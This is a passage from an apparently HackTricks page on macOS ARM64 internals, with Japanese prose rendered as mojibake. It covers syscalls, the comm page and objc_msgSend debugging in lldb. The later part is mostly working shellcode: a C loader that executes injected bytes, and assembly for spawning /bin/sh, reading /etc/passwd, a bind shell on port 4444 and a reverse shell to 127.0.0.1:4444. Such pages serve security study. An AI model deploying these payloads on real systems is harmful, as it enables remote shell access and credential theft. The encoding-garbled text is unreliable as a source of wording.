- **ãƒ¢ãƒ¼ãƒ‰ãŠã‚ˆã³ä¾‹å¤–ãƒã‚¹ã‚¯ãƒ“ãƒƒãƒˆ**ï¼ˆ0-4ï¼‰ï¼šç¾åœ¨ã®å®Ÿè¡ŒçŠ¶æ…‹ã‚’æ±ºå®šã—ã¾ã™ã€‚**5ç•ªç›®**ã¯ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒ32ãƒ“ãƒƒãƒˆï¼ˆ1ï¼‰ã¾ãŸã¯64ãƒ“ãƒƒãƒˆï¼ˆ0ï¼‰ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‹ã‚’ç¤ºã—ã¾ã™ã€‚ä»–ã®4ã¤ã¯ã€**ä½¿ç”¨ä¸­ã®ä¾‹å¤–ãƒ¢ãƒ¼ãƒ‰**ï¼ˆä¾‹å¤–ãŒç™ºç”Ÿã—å‡¦ç†ã•ã‚Œã¦ã„ã‚‹å ´åˆï¼‰ã‚’è¡¨ã—ã¾ã™ã€‚è¨­å®šã•ã‚ŒãŸæ•°å€¤ã¯ã€ã“ã‚ŒãŒå‡¦ç†ã•ã‚Œã¦ã„ã‚‹é–“ã«åˆ¥ã®ä¾‹å¤–ãŒç™ºç”Ÿã—ãŸå ´åˆã®**ç¾åœ¨ã®å„ªå…ˆåº¦**ã‚’ç¤ºã—ã¾ã™ã€‚

<figure><img src="../../../.gitbook/assets/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**ï¼šç‰¹å®šã®ä¾‹å¤–ã¯ã€**`A`**ã€`I`ã€`F` ãƒ“ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦ç„¡åŠ¹ã«ã§ãã¾ã™ã€‚**`A`** ãŒ1ã®å ´åˆã€**éåŒæœŸä¸­æ–­**ãŒãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã¾ã™ã€‚**`I`** ã¯å¤–éƒ¨ãƒãƒ¼ãƒ‰ã‚¦ã‚§ã‚¢ã®**å‰²ã‚Šè¾¼ã¿ãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ï¼ˆIRQï¼‰ã«å¿œç­”ã™ã‚‹ã‚ˆã†ã«æ§‹æˆã•ã‚Œã€Fã¯**é«˜é€Ÿå‰²ã‚Šè¾¼ã¿ãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ï¼ˆFIRï¼‰ã«é–¢é€£ã—ã¦ã„ã¾ã™ã€‚
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% endcode %}

{% hint style="success" %}
æ™‚ã€…ã€**`libsystem_kernel.dylib`** ã‹ã‚‰ã®**`decompiled`**ã‚³ãƒ¼ãƒ‰ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹æ–¹ãŒã€**ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰**ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹ã‚ˆã‚Šã‚‚ç°¡å˜ã§ã™ã€‚ãªãœãªã‚‰ã€ã„ãã¤ã‹ã®ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ï¼ˆBSDã¨Machï¼‰ã®ã‚³ãƒ¼ãƒ‰ã¯ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä»‹ã—ã¦ç”Ÿæˆã•ã‚Œã‚‹ãŸã‚ï¼ˆã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã®ã‚³ãƒ¡ãƒ³ãƒˆã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼‰ã€dylibã§ã¯ä½•ãŒå‘¼ã³å‡ºã•ã‚Œã¦ã„ã‚‹ã‹ãŒã‚ã‹ã‚‹ã‹ã‚‰ã§ã™ã€‚
{% endhint %}

### machdep calls

XNUã¯ã€ãƒã‚·ãƒ³ä¾å­˜ã®å‘¼ã³å‡ºã—ã¨å‘¼ã°ã‚Œã‚‹åˆ¥ã®ã‚¿ã‚¤ãƒ—ã®å‘¼ã³å‡ºã—ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚‰ã®å‘¼ã³å‡ºã—ã®æ•°ã¯ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã«ä¾å­˜ã—ã€å‘¼ã³å‡ºã—ã¾ãŸã¯æ•°å€¤ãŒä¸€å®šã§ã‚ã‚‹ã“ã¨ã¯ä¿è¨¼ã•ã‚Œã¦ã„ã¾ã›ã‚“ã€‚

### comm page

ã“ã‚Œã¯ã€ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ—ãƒ­ã‚»ã‚¹ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ç©ºé–“ã«ãƒãƒƒãƒ—ã•ã‚Œã‚‹ã‚«ãƒ¼ãƒãƒ«æ‰€æœ‰ã®ãƒ¡ãƒ¢ãƒªãƒšãƒ¼ã‚¸ã§ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ¢ãƒ¼ãƒ‰ã‹ã‚‰ã‚«ãƒ¼ãƒãƒ«ã‚¹ãƒšãƒ¼ã‚¹ã¸ã®ç§»è¡Œã‚’ã€ã‚«ãƒ¼ãƒãƒ«ã‚µãƒ¼ãƒ“ã‚¹ã®ãŸã‚ã«ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹ã‚ˆã‚Šã‚‚é€Ÿãã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã®ç§»è¡ŒãŒéå¸¸ã«åŠ¹ç‡çš„ã§ãªã„å ´åˆã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

ä¾‹ãˆã°ã€`gettimeofdate`ã®å‘¼ã³å‡ºã—ã¯ã€`timeval`ã®å€¤ã‚’ç›´æ¥commãƒšãƒ¼ã‚¸ã‹ã‚‰èª­ã¿å–ã‚Šã¾ã™ã€‚

### objc\_msgSend

Objective-Cã‚„Swiftãƒ—ãƒ­ã‚°ãƒ©ãƒ ã§ã“ã®é–¢æ•°ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ã¯éå¸¸ã«ä¸€èˆ¬çš„ã§ã™ã€‚ã“ã®é–¢æ•°ã¯ã€Objective-Cã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å‘¼ã³å‡ºã™ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚

ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ï¼ˆ[è©³ç´°ã¯ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’å‚ç…§](https://developer.apple.com/documentation/objectivec/1456712-objc\_msgsend)ï¼‰:

* x0: self -> ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã¸ã®ãƒã‚¤ãƒ³ã‚¿
* x1: op -> ãƒ¡ã‚½ãƒƒãƒ‰ã®ã‚»ãƒ¬ã‚¯ã‚¿
* x2... -> å‘¼ã³å‡ºã•ã‚ŒãŸãƒ¡ã‚½ãƒƒãƒ‰ã®æ®‹ã‚Šã®å¼•æ•°

ã—ãŸãŒã£ã¦ã€ã“ã®é–¢æ•°ã¸ã®åˆ†å²å‰ã«ãƒ–ãƒ¬ãƒ¼ã‚¯ãƒã‚¤ãƒ³ãƒˆã‚’è¨­å®šã™ã‚‹ã¨ã€lldbã§ç°¡å˜ã«å‘¼ã³å‡ºã•ã‚Œã‚‹å†…å®¹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆã“ã®ä¾‹ã§ã¯ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒ`NSConcreteTask`ã‹ã‚‰ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’å‘¼ã³å‡ºã—ã€ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ï¼‰ã€‚
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
{% hint style="success" %}
**`NSObjCMessageLoggingEnabled=1`** ç’°å¢ƒå¤‰æ•°ã‚’è¨­å®šã™ã‚‹ã¨ã€ã“ã®é–¢æ•°ãŒå‘¼ã³å‡ºã•ã‚ŒãŸã¨ãã« `/tmp/msgSends-pid` ã®ã‚ˆã†ãªãƒ•ã‚¡ã‚¤ãƒ«ã«ãƒ­ã‚°ã‚’å–ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

ã•ã‚‰ã«ã€**`OBJC_HELP=1`** ã‚’è¨­å®šã—ã€ä»»æ„ã®ãƒã‚¤ãƒŠãƒªã‚’å‘¼ã³å‡ºã™ã¨ã€ç‰¹å®šã® Objc-C ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒç™ºç”Ÿã—ãŸã¨ãã«ãƒ­ã‚°ã‚’å–ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ä»–ã®ç’°å¢ƒå¤‰æ•°ã‚’ç¢ºèªã§ãã¾ã™ã€‚
{% endhint %}

ã“ã®é–¢æ•°ãŒå‘¼ã³å‡ºã•ã‚Œã‚‹ã¨ã€æŒ‡å®šã•ã‚ŒãŸã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®å‘¼ã³å‡ºã•ã‚ŒãŸãƒ¡ã‚½ãƒƒãƒ‰ã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã¯ã€ç•°ãªã‚‹æ¤œç´¢ãŒè¡Œã‚ã‚Œã¾ã™:

* æ¥½è¦³çš„ãªã‚­ãƒ£ãƒƒã‚·ãƒ¥æ¤œç´¢ã‚’å®Ÿè¡Œ:
  * æˆåŠŸã—ãŸå ´åˆã€å®Œäº†
* runtimeLock ã‚’å–å¾— (èª­ã¿å–ã‚Š)
  * (realize && !cls->realized) ã®å ´åˆã€ã‚¯ãƒ©ã‚¹ã‚’å®Ÿç¾
  * (initialize && !cls->initialized) ã®å ´åˆã€ã‚¯ãƒ©ã‚¹ã‚’åˆæœŸåŒ–
* ã‚¯ãƒ©ã‚¹å›ºæœ‰ã®ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã‚’è©¦ã™:
  * æˆåŠŸã—ãŸå ´åˆã€å®Œäº†
* ã‚¯ãƒ©ã‚¹ãƒ¡ã‚½ãƒƒãƒ‰ãƒªã‚¹ãƒˆã‚’è©¦ã™:
  * è¦‹ã¤ã‹ã£ãŸå ´åˆã€ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã‚’åŸ‹ã‚ã¦å®Œäº†
* è¦ªã‚¯ãƒ©ã‚¹ã®ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã‚’è©¦ã™:
  * æˆåŠŸã—ãŸå ´åˆã€å®Œäº†
* è¦ªã‚¯ãƒ©ã‚¹ã®ãƒ¡ã‚½ãƒƒãƒ‰ãƒªã‚¹ãƒˆã‚’è©¦ã™:
  * è¦‹ã¤ã‹ã£ãŸå ´åˆã€ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã‚’åŸ‹ã‚ã¦å®Œäº†
* (resolver) ãƒ¡ã‚½ãƒƒãƒ‰ãƒªã‚¾ãƒ«ãƒã‚’è©¦ã—ã€ã‚¯ãƒ©ã‚¹æ¤œç´¢ã‹ã‚‰ç¹°ã‚Šè¿”ã™
* ã¾ã ã“ã“ã«ã„ã‚‹å ´åˆ (= ã™ã¹ã¦ãŒå¤±æ•—ã—ãŸå ´åˆ) ãƒ•ã‚©ãƒ¯ãƒ¼ãƒ€ã‚’è©¦ã™

### ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰

ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã™ã‚‹ã«ã¯:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
ãƒã‚¤ãƒˆã‚’æŠ½å‡ºã™ã‚‹ã«ã¯ï¼š
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
æ–°ã—ã„ macOS å‘ã‘:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹ãŸã‚ã®Cã‚³ãƒ¼ãƒ‰</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
#### ã‚·ã‚§ãƒ«

[**ã“ã¡ã‚‰**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)ã‹ã‚‰å–å¾—ã—ã€èª¬æ˜ã—ã¾ã™ã€‚

{% tabs %}
{% tab title="adrã‚’ä½¿ç”¨" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% ã‚¿ãƒ–ã®ã‚¿ã‚¤ãƒˆãƒ«="ã‚¹ã‚¿ãƒƒã‚¯ã‚’ä½¿ç”¨ã—ã¦" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}

{% tab title="Linuxå‘ã‘ã®adrã‚’ä½¿ç”¨ã—ã¦" %}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
#### catã‚³ãƒãƒ³ãƒ‰ã§èª­ã¿è¾¼ã‚€

ç›®æ¨™ã¯ã€`execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€2ç•ªç›®ã®å¼•æ•°ï¼ˆx1ï¼‰ã¯ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®é…åˆ—ã§ãªã‘ã‚Œã°ãªã‚Šã¾ã›ã‚“ï¼ˆãƒ¡ãƒ¢ãƒªå†…ã§ã¯ã‚¢ãƒ‰ãƒ¬ã‚¹ã®ã‚¹ã‚¿ãƒƒã‚¯ã‚’æ„å‘³ã—ã¾ã™ï¼‰ã€‚
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### ãƒ¡ã‚¤ãƒ³ãƒ—ãƒ­ã‚»ã‚¹ãŒçµ‚äº†ã—ãªã„ã‚ˆã†ã«ã€ãƒ•ã‚©ãƒ¼ã‚¯ã‹ã‚‰shã‚’ä½¿ç”¨ã—ã¦ã‚³ãƒãƒ³ãƒ‰ã‚’å‘¼ã³å‡ºã™
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### ãƒã‚¤ãƒ³ãƒ‰ã‚·ã‚§ãƒ«

ãƒã‚¤ãƒ³ãƒ‰ã‚·ã‚§ãƒ«ã¯ã€[https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) ã‹ã‚‰**ãƒãƒ¼ãƒˆ4444**ã§å–å¾—ã—ã¾ã™ã€‚
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### é€†ã‚·ã‚§ãƒ«

[https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s)ã‹ã‚‰ã€**127.0.0.1:4444**ã¸ã®revshell
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã®ã‚µãƒãƒ¼ãƒˆ</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã¾ãŸã¯**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}
